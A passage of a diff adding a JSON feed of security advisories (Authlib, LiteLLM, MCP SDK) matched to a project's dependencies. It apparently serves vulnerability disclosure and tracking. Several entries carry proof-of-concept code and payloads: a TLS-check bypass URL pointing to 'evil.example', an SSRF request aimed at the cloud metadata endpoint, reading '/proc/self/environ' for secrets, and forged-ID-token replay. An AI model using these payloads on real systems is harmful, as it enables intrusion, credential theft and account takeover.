2.0.0\"). It is deprecated but still shipped, still documented in `docs/jose/jwt.rst`,\n  and still carries the download volume above.\n* **joserfc is not affected by this mechanism.** 1.7.5 was checked: keys carry an explicit `kty` in the\n  data model, so `jwt.decode` with an `RSAKey`/`ECKey` and `alg=HS256` raises `InvalidKeyTypeError` for\n  every one of the seven loader-accepted forms. Typing the key rather than inspecting its bytes is what\n  makes the class unrepresentable there.\n\n## Suggested remediation\n\nEither of these closes the class rather than one more byte form:\n\n1. Decide key family by **type, not by bytes**. Attempt `load_pem_public_key` /\n   `load_pem_x509_certificate` / `load_ssh_public_key` / `load_der_public_key` on the candidate and\n   reject it as an `oct` key if any of them succeeds. This is the approach that makes joserfc immune and\n   it cannot drift out of step with the loader, because it *is* the loader.\n2. If a cheap recogniser must be kept, make it a substring scan rather than an anchored prefix check\n   (`any(m in raw_key for m in POSSIBLE_UNSAFE_KEYS)`) and add the `-----BEGIN CERTIFICATE-----` and\n   DER `SubjectPublicKeyInfo` cases. This is strictly weaker than (1): the recogniser can drift again\n   the next time `cryptography` becomes more tolerant.\n\nSeparately, and independent of this report: giving `JsonWebToken.decode` an `algorithms=` parameter\nwould let callers of the documented module-level object apply the mitigation the docs recommend without\nconstructing a second `JsonWebToken`.\n\n## Credit\n\nFound by zer0d4y5. Happy to test a patch branch before release.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:38:48Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.9.0",
+          "1.3.1..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-7vr2-2fgp-9w7p",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-114615",
+          "https://github.com/authlib/authlib/pull/945",
+          "https://github.com/authlib/authlib/commit/e3bd41cb29dcfee434453b135ffb487884baeedf",
+          "https://github.com/authlib/authlib",
+          "https://github.com/authlib/authlib/releases/tag/v1.9.0"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-jj7h-c3hg-m23x",
+        "source": "osv",
+        "title": "Authlib: is_secure_transport() loopback exemption can be bypassed with a userinfo component, allowing cleartext-HTTP URLs to non-loopback hosts",
+        "summary": "### Summary\n`authlib.common.security.is_secure_transport()` is used throughout Authlib to enforce the OAuth 2.0 / OIDC requirement that endpoint and redirect URIs use TLS, with an RFC 8252 §7.3 exemption for loopback `http://` URIs. The check is implemented as a textual `str.startswith` prefix match, so a URL such as `http://localhost:80@evil.example/cb` — whose actual host is `evil.example` and whose scheme is plain `http` — is accepted as \"secure\". An attacker who can supply a URL to any of the sinks that rely on this check (OIDC RP-Initiated Logout dynamic client registration, RFC 8414 authorization-server metadata validation, error-redirect rendering) can smuggle a cleartext non-loopback URL past the TLS-required guard. This is a defense-in-depth / spec-conformance failure; severity is low.\n\n### Details\n**Affected versions:** `authlib >= 0.13, <= 1.7.2` (all releases containing the loopback prefix exemption; verified against 1.7.2, the current latest)\n\nThe vulnerable function, from `authlib/common/security.py` at v1.7.2:\n\n```python\n13  def is_secure_transport(uri):\n14      \"\"\"Check if the uri is over ssl.\"\"\"\n15      if os.getenv(\"AUTHLIB_INSECURE_TRANSPORT\"):\n16          return True\n17\n18      uri = uri.lower()\n19      return uri.startswith(\n20          (\"https://\", \"http://localhost:\", \"http://127.0.0.1:\", \"http://[::1]:\")\n21      )\n```\n\nPer RFC 3986 §3.2 the authority component of a URI is `[ userinfo \"@\" ] host [ \":\" port ]`. The URL `http://localhost:80@evil.example/cb` therefore has userinfo `localhost:80` and host `evil.example`. Because the check is a raw prefix match against the full URL string, the `http://localhost:` prefix matches the userinfo portion and the function returns `True` even though the scheme is `http` and the host is an arbitrary external name. The trailing `:` in each allow-list entry — presumably intended to force a `host:port` shape and reject `http://localhost.evil.com` — is also satisfied by the `user:password` separator inside userinfo, so `http://localhost:@evil.example/` matches too. The same construction works against all three loopback prefixes (`http://127.0.0.1:...@evil.example/`, `http://[::1]:...@evil.example/`).\n\n`is_secure_transport()` is consumed at the following locations in v1.7.2, none of which independently reject URLs containing a userinfo component:\n\n- `authlib/oidc/rpinitiated/registration.py:50-57` — validation of `post_logout_redirect_uris` during OIDC dynamic client registration for public clients (`token_endpoint_auth_method == \"none\"`). The preceding `is_valid_url()` check (`authlib/common/urls.py:142-146`) only requires `parsed.scheme and parsed.hostname` and does **not** reject userinfo, so the crafted URL passes both guards. A public client can therefore register `http://localhost:80@attacker.example/cb` as a post-logout redirect target; the OpenID Provider will later 302 the end-user's browser to that cleartext non-loopback URL (carrying `state`).\n- `authlib/oauth2/rfc8414/models.py:61,75,100,115,123,248,284` — validation of `issuer`, `authorization_endpoint`, `token_endpoint`, `jwks_uri`, `registration_endpoint`, `revocation_endpoint`, `introspection_endpoint` in Authorization Server Metadata / OIDC Discovery documents. A relying party using `AuthorizationServerMetadata.validate()` would accept endpoint values of this form as satisfying the \"MUST use https\" requirement when they do not.\n- `authlib/oidc/rpinitiated/discovery.py:12` — validation of `end_session_endpoint` in provider metadata.\n- `authlib/oauth2/rfc6749/errors.py:64` and `authlib/oauth1/rfc5849/errors.py:33` — governs how `redirect_uri` is rendered in error bodies (cosmetic).\n\nThe `http://localhost:` prefix was introduced in commit `0225c86b` (first released in v0.13); `http://127.0.0.1:` and `http://[::1]:` were added later in the 1.6.x line. All variants share the same prefix-match weakness.\n\n### PoC\nAgainst the current latest release (1.7.2):\n\n```sh\npython3 -m venv venv\n./venv/bin/pip install 'authlib==1.7.2'\n./venv/bin/python poc.py\n```\n\n`poc.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nis_secure_transport() must return True only for https:// URLs, or http://\nURLs whose host is a loopback address (localhost / 127.0.0.1 / ::1).\n\nBypass: http://localhost:80@evil.example/cb has host 'evil.example'\n(userinfo = 'localhost:80') per RFC 3986, but matches the prefix\n'http://localhost:' and is therefore accepted as secure.\n\"\"\"\nfrom urllib.parse import urlparse\nfrom authlib.common.security import is_secure_transport\n\ncases = [\n    \"http://localhost:80@evil.example/cb\",\n    \"http://127.0.0.1:80@evil.example/cb\",\n    \"http://localhost:@evil.example/cb\",\n]\n\nvulnerable = False\nfor url in cases:\n    parsed = urlparse(url)\n    ok = is_secure_transport(url)\n    print(f\"is_secure_transport({url!r}) = {ok}  \"\n          f\"[actual host = {parsed.hostname!r}, scheme = {parsed.scheme!r}]\")\n    if ok and parsed.hostname not in (\"localhost\", \"127.0.0.1\", \"::1\") and parsed.scheme != \"https\":\n        vulnerable = True\n\nif vulnerable:\n    print(\"\\nVULNERABLE: is_secure_transport() returned True for a plain-HTTP \"\n          \"URL whose host is NOT a loopback address.\")\nelse:\n    print(\"\\nNOT VULNERABLE\")\n\nassert vulnerable, \"expected bypass not observed\"\n```\n\nExpected output:\n\n```\nis_secure_transport('http://localhost:80@evil.example/cb') = True  [actual host = 'evil.example', scheme = 'http']\nis_secure_transport('http://127.0.0.1:80@evil.example/cb') = True  [actual host = 'evil.example', scheme = 'http']\nis_secure_transport('http://localhost:@evil.example/cb') = True  [actual host = 'evil.example', scheme = 'http']\n\nVULNERABLE: is_secure_transport() returned True for a plain-HTTP URL whose host is NOT a loopback address.\n```\n\n### Impact\nDeployments are affected if they rely on `is_secure_transport()` — directly or via the Authlib call sites listed above — to reject cleartext non-loopback URLs supplied by an external party. The most realistic path is an OpenID Provider that enables OIDC dynamic client registration and RP-Initiated Logout: a public client can register a `post_logout_redirect_uris` entry of the form `http://localhost:80@attacker.example/…`, which the provider will later use as an open-redirect target over plain HTTP. Relying parties that call `AuthorizationServerMetadata.validate()` on fetched discovery documents are also affected, though exploiting that sink requires the attacker to influence the metadata document. This does **not** bypass the OAuth 2.0 redirect-URI exact-match registration check and does not by itself yield authentication bypass or token theft; it defeats a TLS-required hardening check.\n\n**Suggested fix:** Parse the URI with `urllib.parse.urlsplit()` and return `True` only if `scheme == \"https\"`, or `scheme == \"http\"` and `hostname in {\"localhost\", \"127.0.0.1\", \"::1\"}`; additionally reject any URI whose parsed `username`/`password` is non-empty at these validation sites.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:37:48Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.8.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-jj7h-c3hg-m23x",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-114614",
+          "https://github.com/authlib/authlib/commit/95ad1f90acf0c7b9cf2a8f25e6eb3f1135b8dc70",
+          "https://github.com/authlib/authlib",
+          "https://github.com/authlib/authlib/releases/tag/v1.8.0"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-g5ff-637f-6q2m",
+        "source": "osv",
+        "title": "LiteLLM: internal_user_viewer arbitrary local file read via `vertex_ai_credentials`",
+        "summary": "## Summary\n\nAn authenticated LiteLLM proxy user could read arbitrary local files from the proxy runtime by sending a crafted `vertex_ai_credentials` value to `/utils/transform_request`. The request-body safety blocklist rejected `vertex_credentials` but missed its alias `vertex_ai_credentials`, which let the value reach the Vertex AI credential loader and trigger a file read that is sent to an attacker-controlled URL.\n\n## Impact\n\nA low-privilege authenticated user (only `internal_user_viewer`, obtainable through SSO login on many deployments) could read any file readable by the LiteLLM process. Reading files such as `/proc/self/environ` can disclose `LITELLM_MASTER_KEY` and provider API keys, so the impact can escalate to full proxy-admin control.\n\n## Remediation\n\nUpgrade to `1.95.0` or later. The fix adds the missing alias to the request-body blocklist, so no configuration change is needed once you upgrade. There is no reliable configuration workaround on affected versions.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:32:36Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.95.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/BerriAI/litellm/security/advisories/GHSA-g5ff-637f-6q2m",
+          "https://github.com/BerriAI/litellm/pull/34189",
+          "https://github.com/BerriAI/litellm/commit/065faf6e695be64a1a367601271839914e4a6621",
+          "https://github.com/BerriAI/litellm",
+          "https://github.com/BerriAI/litellm/releases/tag/v1.95.0"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-w4fh-qvv9-3v23",
+        "source": "osv",
+        "title": "Model Context Protocol Python SDK: Server bearer-token authentication accepts tokens issued for a different resource server",
+        "summary": "### Summary\nIn affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.\n\n### Am I affected?\nYes, if your HTTP server uses the SDK's bearer authentication (`auth=AuthSettings(...)` with `token_verifier=`), its authorization server also issues tokens for other services, and your `TokenVerifier` does not check the token's audience (`aud`) itself.\n\nAffected versions:\n\n- `mcp` 1.10.0 through 1.29.1\n- `mcp` 2.0.0 through 2.1.1\n\n### Fix\nUpgrade to:\n\n- 1.x: `mcp` 1.30.0 or later\n- 2.x: `mcp` 2.2.0 or later\n\n**Upgrading alone changes nothing.** The patched versions add a `validate_token_resource` setting that is off unless you set it. To turn the check on, make both of these changes together:\n\n1. Set `validate_token_resource=True` in `AuthSettings`, with `resource_server_url` set to the audience your authorization server puts in tokens for your server.\n2. Return the token's audience from `verify_token()` as `AccessToken.resource`.\n\nA token for another service then gets `401`. With only the first change, every request gets `401`.\n\nIf your `TokenVerifier` already checks the audience, set `validate_token_resource=False` to silence the deprecation warning. The setting will default to `True` in 3.0.\n\nIf you cannot upgrade yet, reject any token whose `aud` does not include your server inside `verify_token()`. That closes the issue on every version.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T21:06:59Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "mcp"
+        ],
+        "affected_ranges": [
+          "0..1.30.0",
+          "0..2.2.0",
+          "1.10.0..∞",
+          "2.0.0..∞"
+        ],
+        "references": [
+          "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-w4fh-qvv9-3v23",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/3447",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/3451",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/0c9136841ff092987a20700ff9c2c9789bda2f40",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/8c2fa6eabacde869d75568e33b9d466b58c2f512",
+          "https://github.com/modelcontextprotocol/python-sdk",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'mcp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-8m4g-j4wp-wgcg",
+        "source": "osv",
+        "title": "Authlib accepts an empty HMAC key, allowing JWS/JWT signature forgery (HS256/HS384/HS512)",
+        "summary": "Reporter: Cavan Loughran, Celvex Group Inc.\n\nSummary\n\nAuthlib's symmetric (oct) key handling accepts an empty key (empty bytes b'' / empty string '') as a valid HMAC signing and verification key. An empty HMAC key produces a deterministic digest that any party can reproduce, so an attacker who knows (or can cause) the application to verify a token with an empty key can forge arbitrary tokens that pass HS256/HS384/HS512 signature verification. This is the Authlib member of the cross-language empty-HMAC-key family already assigned CVE-2026-44351 (fast-jwt, npm) and CVE-2026-45363 (ruby-jwt, RubyGems).\n\nThis is DISTINCT from Authlib's existing recent JWT-verification advisories. It is not closed by CVE-2026-27962 / GHSA-wvwj-cvrp-7pv5 (JWS JWK header injection, the key=None case), nor by CVE-2026-28802 / GHSA-7wc2-qxgw-g8gg (alg:none blank-signature bypass), nor by GHSA-5357-c2jx-v7qh (algorithm confusion with asymmetric public keys). Those address header-driven key injection, the none algorithm, and asymmetric-vs-symmetric confusion respectively; none of them rejects a zero-length oct key.\n\nAffected versions\n\nAuthlib <= 1.7.2 (latest release 1.7.2, 2026-05-06). Confirmed present at the v1.7.2 release tag and on the current main HEAD. The affected code is in authlib/jose/rfc7518/oct_key.py and authlib/jose/rfc7518/jws_algs.py.\n\nRoot cause (exact code location, release tag v1.7.2)\n\n- authlib/jose/rfc7518/oct_key.py, class OctKey:\n  - validate_raw_key is a type-only check: `return isinstance(key, bytes)`. An empty bytes object passes.\n  - import_key rejects only keys whose material starts with known unsafe prefixes (`if raw_key.startswith(POSSIBLE_UNSAFE_KEYS): raise ValueError(...)`, i.e. PEM/SSH prefixes). Empty bytes do not match any unsafe prefix, so b'' is accepted.\n  - get_op_key loads the raw key without validating its length.\n  - No check anywhere rejects a zero-length key, so an empty key b'' passes every gate.\n- authlib/jose/rfc7518/jws_algs.py, class HMACAlgorithm:\n  - prepare_key: `return OctKey.import_key(raw_data)`.\n  - sign / verify call key.get_op_key(...) then `hmac.new(op_key, msg, self.hash_alg)` / `hmac.compare_digest(...)`. With an empty op key this becomes hmac.new(b'', ...): a deterministic, publicly reproducible digest. There is no empty-key or minimum-length check.\n\nWhy this is a real signature bypass\n\nAn empty HMAC key makes the signature a public, deterministic function of the header and payload, so anyone can compute a valid signature and forge tokens. The realistic trigger matches the sibling CVEs: the deploying application sources the verification key from a place that can be empty at runtime, for example os.environ.get('JWT_SECRET', ''), a database/config column whose default is '', or a key-resolver that returns '' on a miss. Authlib is widely used to BUILD token verifiers (OAuth 2.0 resource servers, OIDC relying parties), and Authlib's own recent advisory history shows the JWS/JWT verify path is the live attack surface, so a key-resolution path that can yield '' is a realistic exposure.\n\nReproduction (prose, no weaponized exploit)\n\n1. In an application that uses Authlib to verify JWS/JWT, arrange for the verification key to be an empty value (e.g. an unset environment variable defaulted to '').\n2. An attacker constructs a token with header {alg: HS256} and an arbitrary payload, and computes the HS256 signature using an empty key (a value any party can reproduce because the key is empty).\n3. Authlib's HMAC verification accepts the token as validly signed, because OctKey.import_key did not reject the empty key and hmac.compare_digest matches the attacker-computable digest. The forged token is treated as authentic.\n\nNo live system was probed; the above describes the class. The vulnerable code path and the absent guard are confirmed by direct reading of the public source at the v1.7.2 tag and on current main.\n\nProof the fix is known-good (no novelty risk)\n\nThe same maintainer's newer JOSE library, joserfc, ALREADY rejects empty oct key material outright. In src/joserfc/_rfc7518/oct_key.py, import_key raises a ValueError on empty oct material, with an explicit note that an empty oct key produces a deterministic HMAC digest that any party can reproduce, allowing trivial signature forgery in JWS HS256/HS384/HS512 verification. (joserfc additionally warns on keys below 112 bits.) The same guard is simply absent from the older, far more widely deployed Authlib rfc7518 package. The flagship Python JOSE libraries also guard: PyJWT raises InvalidKeyError('HMAC key must not be empty.') for zero-length keys, and jwcrypto enforces an RFC 7518 minimum key length.\n\nImpact\n\nToken forgery / authentication bypass in OAuth 2.0 resource servers and OIDC relying parties built on Authlib whenever the HMAC verification key can be empty at runtime. An attacker can mint tokens with arbitrary claims (for example elevated scopes or another user's subject) that pass signature verification.\n\n\nSuggested remediation\n\nReject empty oct key material in OctKey.import_key (and/or validate_raw_key), exactly as the maintainer's joserfc library already does, before the key can reach hmac.new in HMACAlgorithm.sign / verify. Consider also adopting joserfc's sub-112-bit minimum-length warning/rejection for HMAC keys.\n\nDisclosure\n\nReporter: Cavan Loughran, Celvex Group Inc.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T16:09:22Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.9.1",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-8m4g-j4wp-wgcg",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-114616",
+          "https://github.com/authlib/authlib/commit/4ff30db442c70e29486e1982cb0ad37c037f5f4b",
+          "https://github.com/authlib/authlib",
+          "https://github.com/authlib/authlib/releases/tag/v1.9.1"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-x4rv-c3wx-4cr8",
+        "source": "osv",
+        "title": "Authlib: Unvalidated request_uri fetch in JWT-secured authorization request (JAR) leading to SSRF",
+        "summary": "### Summary\n\nAuthlib's RFC 9101 (JAR) extension passes the attacker-controlled `request_uri` authorization parameter straight to the `get_request_object()` fetch hook with no validation, at a pre-authentication endpoint. Authlib already defines the pre-registration allowlist for this (`request_uris` client metadata and `require_request_uri_registration` server metadata) but the extension never consults it, and both docstrings instruct integrators to implement the hook as an unrestricted `requests.get(request_uri)`. Deployments following the documented pattern get an unauthenticated SSRF primitive. \n### Details\n\nVerified against authlib 1.7.2 and current `main`. All line numbers below are from `authlib/oauth2/rfc9101/authorization_server.py`.\n\nThe extension registers itself on the `before_get_authorization_grant` hook (lines 62-65), so it runs on every authorization request before any user or client authentication. `support_request_uri` defaults to `True` (line 58).\n\nThe only gate before the sink is that `client_id` names an existing client (lines 91-103). A `client_id` is a public, non-secret identifier.\n\nThe sink at line 159 forwards the raw parameter with no scheme, host, or allowlist check:\n\n```python\ndef _get_raw_request_object(self, request: OAuth2Request) -> str:\n    if \"request_uri\" in request.payload.data:\n        raw_request_object = self.get_request_object(\n            request.payload.data[\"request_uri\"]\n        )\n        if not raw_request_object:\n            raise InvalidRequestUriError(state=request.payload.state)\n```\n\n`get_request_object` is abstract (line 213, `raise NotImplementedError()` at line 225), so authlib itself performs no outbound request. The defect is that authlib supplies unvalidated attacker input to that extension point and then documents the insecure implementation twice — in the class docstring (lines 34-38) and in the hook's own docstring (lines 218-223):\n\n```python\ndef get_request_object(self, request_uri: str):\n    try:\n        return requests.get(request_uri).text\n    except requests.Exception:\n        return None\n```\n\nTwo points sharpen this beyond a generic documentation issue:\n\n- **The allowlist already exists and is ignored.** Authlib validates `request_uris` as client metadata (`authlib/oauth2/rfc7591/claims.py:319`) and `require_request_uri_registration` as server metadata (`authlib/oauth2/rfc8414/models.py:263`). The `rfc9101` package contains zero references to either name, so the pre-registration model is never enforced at the point of use.\n- **RFC 9101 §10.4.1 asks for controls that are absent.** It states the server should \"a) check that the value of the `request_uri` parameter does not point to an unexpected location, b) check that the media type of the response is `application/oauth-authz-req+jwt`, c) implement a timeout for obtaining the content of `request_uri`, and d) not perform recursive GET on the `request_uri`.\" The extension implements none of these and the documented example implements none of them either.\n\nThe two failure paths are distinguishable, which supplies the inference channel for a blind SSRF: a falsy fetch result raises `InvalidRequestUriError` (`invalid_request_uri`, lines 162-163), while a successful fetch of non-JWT content raises `InvalidRequestObjectError` (`invalid_request_object`, line 186).\n\n### PoC\n\nThis demonstrates the library-level defect with no network egress required: it shows the unvalidated URI reaching the fetch hook pre-authentication.\n\n```bash\npython -m venv .venv && .venv/bin/pip install authlib\n```\n\n```python\nfrom authlib.oauth2.rfc6749.requests import BasicOAuth2Payload, OAuth2Request\nfrom authlib.oauth2.rfc9101 import JWTAuthenticationRequest\n\nreached = []\n\n\nclass Extension(JWTAuthenticationRequest):\n    def get_request_object(self, request_uri):\n        reached.append(request_uri)  # the docstring puts requests.get(request_uri) here\n        return None\n\n    def resolve_client_public_key(self, client):\n        return {\"keys\": []}\n\n    def get_server_metadata(self):\n        return {}\n\n    def get_client_require_signed_request_object(self, client):\n        return False\n\n\nclass AuthorizationServer:\n    def query_client(self, client_id):\n        return object()\n\n\nuri = \"http://169.254.169.254/latest/meta-data/\"\nrequest = OAuth2Request(\"GET\", \"https://as.example/authorize\")\nrequest.payload = BasicOAuth2Payload({\"client_id\": \"demo\", \"request_uri\": uri})\n\ntry:\n    Extension().parse_authorization_request(AuthorizationServer(), request)\nexcept Exception as exc:\n    print(\"error:\", type(exc).__name__)\n\nprint(\"fetch hook received:\", reached)\n```\n\nOutput on authlib 1.7.2:\n\n```text\nerror: InvalidRequestUriError\nfetch hook received: ['http://169.254.169.254/latest/meta-data/']\n```\n\nAgainst a deployment that used the docstring implementation, the equivalent unauthenticated request is:\n\n```text\nGET /authorize?response_type=code&client_id=demo&request_uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F\n```\n\nReturning a fetched-but-non-JWT body instead of `None` in the snippet above yields `InvalidRequestObjectError` rather than `InvalidRequestUriError`, showing the oracle that distinguishes a reachable target from an unreachable one.\n\n### Impact\n\nServer-side request forgery, reachable without authentication by anyone who knows a valid `client_id`. In a deployment that implemented `get_request_object` as documented, an attacker can make the authorization server issue GET requests to arbitrary URLs: internal-only services, cloud metadata endpoints such as `169.254.169.254`, and side-effectful internal GET routes. The `invalid_request_uri` versus `invalid_request_object` split, together with response timing, provides an oracle for internal host and port discovery. RFC 9101 §10.4.1 additionally notes the DoS and recursive-lookup risks that the missing timeout and recursion checks leave open.\n\nResponse bodies are consumed as a JWT and never reflected, so this is a blind primitive rather than direct data exfiltration. Because the fetch executes in integrator code, deployments that already allowlist inside their override are unaffected — but authlib provides no hook to make that the default, ships `support_request_uri=True`, and its documentation steers integrators to the unsafe implementation, so the insecure outcome is the expected one.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:39:18Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.9.0",
+          "1.6.0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-x4rv-c3wx-4cr8",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-114620",
+          "https://github.com/authlib/authlib/pull/949",
+          "https://github.com/authlib/authlib/commit/6563f6f7a8c2f71d2f85ee7511d72a4fbae3acc0",
+          "https://github.com/authlib/authlib/commit/891e3f10ae5989176211f8be35dcc7cd40aa92c6",
+          "https://github.com/authlib/authlib",
+          "https://github.com/authlib/authlib/releases/tag/v1.9.0"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-c5mf-xmp2-59rc",
+        "source": "osv",
+        "title": "Authlib: ID token can disable its own nonce validation via the nonce_supported claim",
+        "summary": "### Summary\n\n`OpenIDMixin.parse_id_token()` reads the `nonce_supported` claim from the ID token it is validating. When that claim is boolean `false`, the expected nonce is set to `None` and nonce validation is skipped for that token.\n\nAn ID token that carries this claim is therefore accepted in a session whose nonce does not match. A captured, validly signed ID token belonging to a victim can be replayed into an attacker-controlled session, authenticating the attacker as the victim at the relying party.\n\nThe code is identical in `authlib/integrations/base_client/sync_openid.py:82-83` and `authlib/integrations/base_client/async_openid.py:84-85`, so all framework integrations are affected. Fixed versions: none; reproduced on 1.8.0 (commit c529a61a).\n  \nPreconditions: the ID token must carry a valid signature and pass `iss` and `aud` validation, and the attacker must be able to supply it to `parse_id_token()`. Authorization code flow is not affected. Implicit and hybrid relying parties, and applications calling `parse_id_token()` directly, are affected.\n\n### Details\n\n## Affected code\n\n`authlib/integrations/base_client/sync_openid.py:80-85`, in `parse_id_token()`:\n\n```python\nclaims = claims_cls(token.claims, token.header, claims_options, claims_params)\n# https://github.com/authlib/authlib/issues/259\nif claims.get(\"nonce_supported\") is False:\n    claims.params[\"nonce\"] = None\n\nclaims.validate(leeway=leeway)\n```\n\n`authlib/integrations/base_client/async_openid.py:82-86` contains the same code.\n\n## Source of the claim\n\n`claims` is constructed from `token.claims`, which is the decoded payload of the ID token passed to `parse_id_token()`:\n\n```python\ntoken = jwt.decode(\n    token[\"id_token\"],\n    key=key_set,\n    registry=JWSRegistry(algorithms=alg_values, strict_check_header=False),\n)\n...\nclaims = claims_cls(token.claims, token.header, claims_options, claims_params)\n```\n\n`claims.get(\"nonce_supported\")` therefore resolves against the ID token payload. It is not read from `load_server_metadata()`, from client configuration, or from any other source under the relying party's control.\n\n## Effect on validation\n\n`IDToken.validate_nonce()` at `authlib/oidc/core/claims.py:69-83` performs the comparison only when the expected value is truthy:\n\n```python\nnonce_value = self.params.get(\"nonce\")\nif nonce_value:\n    if \"nonce\" not in self:\n        raise MissingClaimError(\"nonce\")\n    if nonce_value != self[\"nonce\"]:\n        raise InvalidClaimError(\"nonce\")\n```\n\nAssigning `claims.params[\"nonce\"] = None` makes `nonce_value` falsy, so both the presence check and the equality check are skipped. No error is raised and `claims.validate()` completes normally.\n\nThe docstring of that same method states the requirement:\n\n> If present in the ID Token, Clients MUST verify that the nonce Claim Value is equal to the value of the nonce parameter sent in the Authentication Request.\n\n## Trigger condition\n\nThe comparison is `is False`, so only a JSON boolean `false` activates the branch. A string value `\"false\"` does not, and nonce validation proceeds normally in that case.\n\n## Origin\n\nThe branch was added in commit `3ca7333c` (\"Skip verifying nonce for Apple case\") to accommodate a provider that emits a `nonce_supported` claim, as referenced by the inline comment pointing to issue #259.\n\n## Remediation\n\nRead the flag from server metadata or client configuration rather than from the token:\n\n```python\nmetadata = self.load_server_metadata()\nif metadata.get(\"nonce_supported\") is False:\n    claims.params[\"nonce\"] = None\n```\n\nThis preserves the behavior for relying parties configured against a provider that does not support nonces, while preventing the token from determining whether it is subject to nonce validation.\n\n### Proof of concept\n\n## Environment\n\n- authlib 1.8.0, commit `c529a61a` (tag `v1.8.0`)\n- Python 3.14\n- joserfc 1.7.5\n- No network access required\n\n```\ngit clone https://github.com/authlib/authlib.git && cd authlib\ngit checkout c529a61a\npython3 -m venv .venv\n.venv/bin/pip install -e . joserfc==1.7.5\n.venv/bin/python poc.py\n```\n\n## Configuration\n\nThe relying party is a subclass of the shipped `OpenIDMixin` supplying only `client_id` and `load_server_metadata()`. `fetch_jwk_set()` returns `metadata[\"jwks\"]` directly when the key set is present in metadata, so no HTTP request is made and no part of the validation path is stubbed.\n\nThe signing key is a generated RSA key. All three tokens are signed with it, carry `iss` and `aud` matching the relying party configuration, and are within their validity window. The relying party's session nonce is `nonce-the-rp-actually-generated`; every token carries the different nonce `nonce-from-the-captured-token`.\n\n## poc.py\n\n```python\nfrom joserfc import jwt\nfrom joserfc.jwk import RSAKey\nfrom authlib.integrations.base_client.sync_openid import OpenIDMixin\n\nISSUER = \"https://as.example\"\nCLIENT_ID = \"rp-client\"\nKEY = RSAKey.generate_key(2048, parameters={\"kid\": \"k1\"})\nJWKS = {\"keys\": [KEY.as_dict(private=False)]}\n\n\nclass RP(OpenIDMixin):\n    client_id = CLIENT_ID\n\n    def load_server_metadata(self):\n        return {\"issuer\": ISSUER, \"jwks\": JWKS}\n\n\ndef id_token(nonce, sub=\"victim\", nonce_supported=None):\n    claims = {\"iss\": ISSUER, \"sub\": sub, \"aud\": CLIENT_ID,\n              \"iat\": 1000000000, \"exp\": 4000000000, \"auth_time\": 1000000000}\n    if nonce is not None:\n        claims[\"nonce\"] = nonce\n    if nonce_supported is not None:\n        claims[\"nonce_supported\"] = nonce_supported\n    return jwt.encode({\"alg\": \"RS256\", \"kid\": \"k1\"}, claims, KEY)\n\n\nrp = RP()\nSESSION_NONCE = \"nonce-the-rp-actually-generated\"\nCAPTURED_NONCE = \"nonce-from-the-captured-token\"\n\ncases = [\n    (\"[1] no nonce_supported claim\", None),\n    (\"[2] nonce_supported: false\", False),\n    (\"[3] nonce_supported: \\\"false\\\"\", \"false\"),\n]\n\nfor label, flag in cases:\n    tok = {\"access_token\": \"AT\",\n           \"id_token\": id_token(CAPTURED_NONCE, 